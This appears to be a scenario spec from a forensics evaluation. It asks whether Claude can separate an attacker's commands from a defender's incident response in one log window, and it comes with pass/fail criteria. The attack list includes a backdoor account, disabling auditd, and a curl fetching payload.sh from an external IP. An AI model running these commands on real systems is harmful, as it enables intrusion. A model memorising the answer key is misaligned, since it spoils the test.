# Scenario 21 — Mid-incident response (authorship attribution test)

**Ground truth: compromise occurred at 02:14 UTC; defender `alice` is
actively remediating when the evidence was captured.**

This scenario tests whether Claude can separate attacker activity from
defender activity when both appear in the same log window. The
attacker commands and the defender's remediation commands are
stylistically similar — both run `sudo` from a root shell, both touch
the same artifacts. Without attribution, the evidence reads as two
waves of attack.

## Attack window (02:14 – 02:17)

- Root SSH login from `45.123.45.67` (external IP)
- `useradd sysd` UID 1050
- `systemctl stop auditd`
- `curl /tmp/.x https://185.177.124.22/payload.sh`
- `chattr +i /tmp/.x`

## Response window (02:42 – 02:55)

`alice` SSHes in from `10.0.2.15` (internal IP), her usual source.
Her `.bash_history` is intact (attacker did NOT tamper with it) and
documents the response:
- Reviews logs (`last`, `tail auth.log`)
- Restarts auditd
- Removes chattr +i, deletes `/tmp/.x`
- Deletes the `sysd` backdoor account via `userdel -r sysd`
- Rotates the root password
- Edits sshd_config to disable password auth, restarts sshd
- Null-routes the attacker IP via iptables
- Snapshots `/etc/shadow` to `/root/incident-response/` for evidence
- Bundles `/etc` and `/var/log` as `/root/incident-response/artifact-bundle.tar.gz`

`/etc/motd` announces the incident status and lists what alice has
already done — an informal "don't duplicate actions" signal.

## Pass criteria

**Pass verdict:** identifies the compromise, attributes the attacker
window (02:14 – 02:17 from `45.123.45.67`) separately from the
defender window (alice, 02:42 – 02:55). Acceptable framings:
"attack + active IR response," "attacker X, defender Y, attribution
by source IP / user / timestamp."

**Fail verdict:**
- Mis-attributes alice's remediation as attacker persistence
  (e.g., "root password was rotated by the attacker to lock out
  legitimate admins")
- Mis-attributes the attacker's initial `systemctl stop auditd` as
  defender action (ignores the external source IP on the root login)
- Flags `/root/incident-response/*` (the evidence bundle alice
  created) as attacker exfiltration

## Signals for correct attribution

1. The external root login is from `45.123.45.67` (not RFC1918)
2. `alice` logs in from `10.0.2.15` — her consistent internal IP
3. alice's bash history is the primary evidence of who did what
   during the 02:42+ window
4. `/etc/motd` documents the declared incident and what alice did
5. Commands like `passwd root`, `vi sshd_config`, and `iptables -I
   ... -s ATTACKER_IP -j DROP` are **defensive** actions; commands
   like `useradd sysd`, `chattr +i`, and `curl ... payload.sh`
   are **offensive**
